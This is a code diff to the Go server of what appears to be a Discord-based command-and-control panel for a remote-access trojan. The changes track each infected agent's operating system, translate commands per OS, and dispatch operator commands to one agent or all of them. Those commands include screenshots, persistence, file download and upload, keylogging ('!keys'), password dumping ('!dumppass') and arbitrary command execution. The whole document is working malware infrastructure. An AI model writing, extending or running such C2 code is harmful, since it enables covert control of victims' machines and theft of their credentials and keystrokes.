@@ -34,10 +34,15 @@ type LogEntry struct {
 	Timestamp time.Time `json:"timestamp"`
 }
 
+type AgentInfo struct {
+	LastSeen time.Time
+	OS       string
+}
+
 var (
 	logs         []LogEntry
 	logsMutex    sync.Mutex
-	agents       = make(map[string]time.Time)
+	agents       = make(map[string]AgentInfo)
 	logIDCounter = 0
 )
 
@@ -136,14 +141,21 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	content := string(decrypted)
 	source := "Unknown"
+	os := "Unknown"
 
 	if strings.HasPrefix(content, "[") && strings.Contains(content, "]") {
 		end := strings.Index(content, "]")
-		source = content[1:end]
+		sourceLine := content[1:end]
 		content = content[end+1:]
 
+		parts := strings.Split(sourceLine, ":")
+		source = parts[0]
+		if len(parts) > 1 {
+			os = parts[1]
+		}
+
 		logsMutex.Lock()
-		agents[source] = time.Now()
+		agents[source] = AgentInfo{LastSeen: time.Now(), OS: os}
 		logsMutex.Unlock()
 	}
 
@@ -175,6 +187,7 @@ type AgentStatus struct {
 	Name     string `json:"name"`
 	Status   string `json:"status"`
 	LastSeen string `json:"lastSeen"`
+	OS       string `json:"os"`
 }
 
 func handleAgents(w http.ResponseWriter, r *http.Request) {
@@ -184,16 +197,17 @@ func handleAgents(w http.ResponseWriter, r *http.Request) {
 	var agentList []AgentStatus
 	now := time.Now()
 
-	for agent, lastSeen := range agents {
+	for agentName, agentInfo := range agents {
 		status := "Online"
-		if now.Sub(lastSeen) > 1*time.Minute {
+		if now.Sub(agentInfo.LastSeen) > 1*time.Minute {
 			status = "Offline"
 		}
 
 		agentList = append(agentList, AgentStatus{
-			Name:     agent,
+			Name:     agentName,
 			Status:   status,
-			LastSeen: lastSeen.Format("15:04:05"),
+			LastSeen: agentInfo.LastSeen.Format("15:04:05"),
+			OS:       agentInfo.OS,
 		})
 	}
 	json.NewEncoder(w).Encode(agentList)
@@ -202,6 +216,49 @@ func handleAgents(w http.ResponseWriter, r *http.Request) {
 type CommandRequest struct {
 	Agent   string `json:"agent"`
 	Command string `json:"command"`
+}
+
+func translateCommand(command, os string) string {
+	if os == "windows" {
+		return command
+	}
+
+	switch command {
+	case "dir":
+		return "ls"
+	case "del":
+		return "rm"
+	case "move":
+		return "mv"
+	case "copy":
+		return "cp"
+	default:
+		return command
+	}
+}
+
+func buildCommand(command, target string) string {
+	var cmdToSend string
+	if strings.HasPrefix(command, "!screenshot") {
+		cmdToSend = fmt.Sprintf("!screenshot [%s]", target)
+	} else if strings.HasPrefix(command, "!persist") {
+		cmdToSend = fmt.Sprintf("!persist [%s]", target)
+	} else if strings.HasPrefix(command, "!download") {
+		args := strings.TrimPrefix(command, "!download")
+		args = strings.TrimSpace(args)
+		cmdToSend = fmt.Sprintf("!download [%s] %s", target, args)
+	} else if strings.HasPrefix(command, "!upload") {
+		args := strings.TrimPrefix(command, "!upload")
+		args = strings.TrimSpace(args)
+		cmdToSend = fmt.Sprintf("!upload [%s] %s", target, args)
+	} else if strings.HasPrefix(command, "!keys") {
+		cmdToSend = fmt.Sprintf("!keys [%s]", target)
+	} else if strings.HasPrefix(command, "!dumppass") {
+		cmdToSend = fmt.Sprintf("!dumppass [%s]", target)
+	} else {
+		cmdToSend = fmt.Sprintf("!exec [%s] %s", target, command)
+	}
+	return cmdToSend
 }
 
 func handleCommand(w http.ResponseWriter, r *http.Request) {
@@ -221,55 +278,38 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 		target = "ALL"
 	}
 
-	var cmdToSend string
-	if strings.HasPrefix(req.Command, "!screenshot") {
-		if target == "ALL" {
-			cmdToSend = "!screenshot"
-		} else {
-			cmdToSend = fmt.Sprintf("!screenshot [%s]", target)
+	if target == "ALL" {
+		logsMutex.Lock()
+		agentList := make(map[string]AgentInfo)
+		for name, info := range agents {
+			agentList[name] = info
 		}
-	} else if strings.HasPrefix(req.Command, "!persist") {
-		if target == "ALL" {
-			cmdToSend = "!persist"
-		} else {
-			cmdToSend = fmt.Sprintf("!persist [%s]", target)
-		}
-	} else if strings.HasPrefix(req.Command, "!download") {
-		args := strings.TrimPrefix(req.Command, "!download")
-		args = strings.TrimSpace(args)
-		if target == "ALL" {
-			cmdToSend = fmt.Sprintf("!download %s", args)
-		} else {
-			cmdToSend = fmt.Sprintf("!download [%s] %s", target, args)
-		}
-	} else if strings.HasPrefix(req.Command, "!upload") {
-		args := strings.TrimPrefix(req.Command, "!upload")
-		args = strings.TrimSpace(args)
-		if target == "ALL" {
-			cmdToSend = fmt.Sprintf("!upload %s", args)
-		} else {
-			cmdToSend = fmt.Sprintf("!upload [%s] %s", target, args)
-		}
-	} else if strings.HasPrefix(req.Command, "!keys") {
-		if target == "ALL" {
-			cmdToSend = "!keys"
-		} else {
-			cmdToSend = fmt.Sprintf("!keys [%s]", target)
-		}
-	} else if strings.HasPrefix(req.Command, "!dumppass") {
-		if target == "ALL" {
-			cmdToSend = "!dumppass"
-		} else {
-			cmdToSend = fmt.Sprintf("!dumppass [%s]", target)
+		logsMutex.Unlock()
+
+		for name, agentInfo := range agentList {
+			command := translateCommand(req.Command, agentInfo.OS)
+			cmdToSend := buildCommand(command, name)
+			_, err := DiscordSession.ChannelMessageSend(CommandChannel, cmdToSend)
+			if err != nil {
+				log.Printf("Failed to send command to %s: %v", name, err)
+			}
 		}
 	} else {
-		cmdToSend = fmt.Sprintf("!exec [%s] %s", target, req.Command)
-	}
-
-	_, err := DiscordSession.ChannelMessageSend(CommandChannel, cmdToSend)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
+		logsMutex.Lock()
+		agentInfo, ok := agents[target]
+		logsMutex.Unlock()
+		if ok {
+			command := translateCommand(req.Command, agentInfo.OS)
+			cmdToSend := buildCommand(command, target)
+			_, err := DiscordSession.ChannelMessageSend(CommandChannel, cmdToSend)
+			if err != nil {
+				http.Error(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+		} else {
+			http.Error(w, "Agent not found", http.StatusNotFound)
+			return
+		}
 	}
 
 	addLog("Server", fmt.Sprintf("Sent to %s: %s", req.Agent, req.Command))
